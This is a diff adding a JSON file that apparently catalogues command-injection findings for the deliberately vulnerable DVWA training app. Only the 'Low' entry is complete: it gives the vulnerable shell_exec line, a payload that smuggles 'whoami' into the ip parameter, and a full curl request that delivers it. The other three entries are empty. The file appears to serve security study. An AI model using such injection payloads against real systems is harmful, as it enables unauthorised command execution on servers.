@@ -1,0 +1,50 @@
+[
+  {
+    "security_level": "Low",
+    "vulnerability_type": "Command_Injection",
+    "owasp_category": "Injection",
+    "page_url": "/vulnerabilities/exec/",
+    "parameter": "ip",
+    "http_method": "POST",
+    "vulnerable_code_line": "shell_exec( 'ping -c 4 ' . $target );",
+    "payload": "127.0.0.1 && whoami",
+    "example_command": "curl -X POST 'http://[DVWA_IP]/vulnerabilities/exec/' -b 'security=low; PHPSESSID=[YOUR_SESSION_ID]' -d 'ip=127.0.0.1 && whoami&submit=Submit'",
+    "notes": "Không có bất kỳ bộ lọc (filter) nào. Mã nguồn thực thi trực tiếp biến '$target' (là input của bạn)."
+  },
+  {
+    "security_level": "Medium",
+    "vulnerability_type": "Command_Injection",
+    "owasp_category": "Injection",
+    "page_url": "/vulnerabilities/exec/",
+    "parameter": "ip",
+    "http_method": "POST",
+    "vulnerable_code_line": "",
+    "payload": "",
+    "example_command": "",
+    "notes": ""
+  },
+  {
+    "security_level": "High",
+    "vulnerability_type": "Command_Injection",
+    "owasp_category": "Injection",
+    "page_url": "/vulnerabilities/exec/",
+    "parameter": "ip",
+    "http_method": "POST",
+    "vulnerable_code_line": "",
+    "payload": "",
+    "example_command": "",
+    "notes": ""
+  },
+  {
+    "security_level": "Impossible",
+    "vulnerability_type": "Command_Injection",
+    "owasp_category": "Injection",
+    "page_url": "/vulnerabilities/exec/",
+    "parameter": "ip",
+    "http_method": "POST",
+    "vulnerable_code_line": "",
+    "payload": "",
+    "example_command": "",
+    "notes": ""
+  }
+]
